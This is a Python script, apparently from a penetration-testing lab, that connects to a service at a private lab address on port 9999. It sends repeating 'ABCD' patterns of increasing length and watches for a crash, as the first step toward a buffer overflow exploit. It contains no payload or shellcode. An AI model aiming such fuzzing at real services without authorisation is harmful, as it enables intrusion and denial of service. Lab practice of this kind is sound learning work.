import socket
import time

def create_pattern(length):
    pattern = ''
    parts = ['A', 'B', 'C', 'D']
    while len(pattern) < length:
        pattern += ''.join(parts)
    return pattern[:length]

def test_buffer(size):
    try:
        target_ip = "192.168.56.101"
        target_port = 9999
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        
        # Receive banner
        initial_response = s.recv(1024)
        print(f"Testing buffer size: {size}")
        
        # Create pattern instead of just A's
        payload = create_pattern(size) + "\n"
        print(f"Sending {size} bytes of pattern...")
        s.send(payload.encode())
        
        time.sleep(1)
        
        try:
            response = s.recv(1024)
            print(f"Response received: {response.decode()}")
        except:
            print("No response - possible crash!")
            
        s.close()
        
    except Exception as e:
        print(f"Error occurred: {e}")
        print("Service might have crashed!")

# Test larger buffer sizes
buffer_sizes = [500, 1000, 1500, 2000]

for size in buffer_sizes:
    test_buffer(size)
    print("\nWaiting 3 seconds before next test...")
    time.sleep(3)  # Give service time to recover if it crashed
